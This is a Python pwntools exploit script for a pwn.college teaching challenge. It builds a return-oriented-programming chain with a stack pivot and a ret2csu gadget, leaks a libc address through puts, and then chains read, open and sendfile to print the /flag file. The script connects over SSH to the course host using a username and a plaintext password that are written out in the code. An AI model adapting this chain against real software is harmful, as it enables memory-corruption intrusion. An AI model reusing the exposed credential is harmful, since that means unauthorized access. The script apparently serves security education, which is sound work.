from pwn import *

e = ELF('./babyrop_level9_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level9_teaching1')
# p = e.process(env={"LD_PRELOAD":libc.path})

leave_ret = 0x00000000004016b6
rbp = 0x000000000040127d
rdi = 0x0000000000401b73
csu = 0x401B6A
csu_run = 0x401B50

input = e.symbols['input']

pay = p64(rbp) + p64(input + 0x18) + p64(leave_ret) + p64(input + 0x100)
pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])
'''
.text:0000000000401B6A                 pop     rbx
.text:0000000000401B6B                 pop     rbp
.text:0000000000401B6C                 pop     r12 (rdi)
.text:0000000000401B6E                 pop     r13 (rsi)
.text:0000000000401B70                 pop     r14 (rdx)
.text:0000000000401B72                 pop     r15 (func)
'''
pay += p64(csu) + p64(0) + p64(1) + p64(0) + p64(input + 0x200) + p64(0x100) + p64(e.got['read']) + p64(csu_run)
pay += p64(0) * 7
pay += p64(rbp) + p64(input + 0x200 - 8) + p64(leave_ret)

p.sendafter(b'ropchain!\n', pay)

p.recvuntil(b'Exiting!\n')

base = u64(p.recv(6)+b'\x00\x00') - libc.symbols['puts']
libc.address = base

print(hex(base))

rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

pay = p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx_r12) + p64(0x8) + p64(0) + p64(libc.symbols['read'])               #read(0,bss+0x100,8);
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(libc.symbols['open'])                                              #open(bss+0x100,0)
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx_r12) + p64(0) + p64(0) + p64(rcx) + p64(100) + p64(libc.symbols['sendfile']) #sendfile(1,3,0,100)

# pause()
p.send(pay)
p.send(b'/flag\x00')

p.interactive()